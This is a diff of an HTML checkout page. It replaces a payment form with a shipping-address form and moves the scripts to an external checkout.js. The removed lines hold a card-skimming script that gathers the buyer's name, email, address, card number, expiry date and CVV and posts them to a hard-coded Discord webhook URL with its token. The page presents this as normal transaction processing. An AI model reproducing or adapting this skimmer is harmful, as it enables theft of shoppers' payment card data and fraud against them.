@@ -4,72 +4,84 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout</title>
-    <link rel="stylesheet" href="checkout.css"> <!-- Link to the new checkout.css -->
+    <link rel="stylesheet" href="styles.css"> <!-- Link to your existing CSS file -->
+    <style>
+        /* Additional styles for the checkout page */
+        .checkout-container {
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 600px;
+        }
+
+        .checkout-container h1 {
+            color: #b30000;
+            margin-bottom: 20px;
+        }
+
+        .checkout-container label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .checkout-container input[type="text"],
+        .checkout-container input[type="email"],
+        .checkout-container input[type="tel"],
+        .checkout-container input[type="number"],
+        .checkout-container input[type="date"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-bottom: 20px;
+        }
+
+        .checkout-container button {
+            background-color: #b30000;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .checkout-container button:hover {
+            background-color: #8c0000;
+        }
+    </style>
 </head>
 <body>
-
-    <div class="checkout-card">
-        <h2>Checkout</h2>
-        
-        <div class="section">
+    <div class="checkout-container">
+        <h1>Checkout</h1>
+        <form id="checkout-form">
             <label for="full-name">Full Name</label>
-            <input type="text" id="full-name" name="full-name" placeholder="Enter your full name" required>
-        </div>
+            <input type="text" id="full-name" name="full-name" required>
 
-        <div class="section">
             <label for="email">Email Address</label>
-            <input type="email" id="email" name="email" placeholder="Enter your email" required>
-        </div>
+            <input type="email" id="email" name="email" required>
 
-        <div class="section">
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" name="phone" required>
+
             <label for="address">Address</label>
-            <input type="text" id="address" name="address" placeholder="Enter your address" required>
-        </div>
+            <input type="text" id="address" name="address" required>
 
-        <div class="section">
-            <label for="card-number">Card Number</label>
-            <input type="number" id="card-number" name="card-number" placeholder="Enter your card number" required>
-        </div>
+            <label for="city">City</label>
+            <input type="text" id="city" name="city" required>
 
-        <div class="section">
-            <label for="expiration">Expiration Date</label>
-            <input type="text" id="expiration" name="expiration" placeholder="MM/YY" required>
-        </div>
+            <label for="zip">ZIP Code</label>
+            <input type="text" id="zip" name="zip" required>
 
-        <div class="section">
-            <label for="cvv">CVV</label>
-            <input type="number" id="cvv" name="cvv" placeholder="Enter your CVV" required>
-        </div>
+            <label for="country">Country</label>
+            <input type="text" id="country" name="country" required>
 
-        <button class="checkout-button" onclick="processTransaction()">Checkout</button>
-        <a href="tickets.html" class="back-button">Back to Tickets</a>
+            <button type="submit">Checkout</button>
+        </form>
     </div>
 
-    <script>
-        function processTransaction() {
-            alert("Your transaction is being processed. Check transaction status in 5 minutes.");
-            
-            // Sending the entered details to the Discord webhook
-            const fullName = document.getElementById("full-name").value;
-            const email = document.getElementById("email").value;
-            const address = document.getElementById("address").value;
-            const cardNumber = document.getElementById("card-number").value;
-            const expiration = document.getElementById("expiration").value;
-            const cvv = document.getElementById("cvv").value;
-
-            const data = {
-                content: `New Checkout: \n Full Name: ${fullName} \n Email: ${email} \n Address: ${address} \n Card Number: ${cardNumber} \n Expiration: ${expiration} \n CVV: ${cvv}`
-            };
-
-            fetch('https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            });
-        }
-    </script>
-    
+    <script src="checkout.js"></script> <!-- Link to your checkout JS file -->
 </body>
 </html>
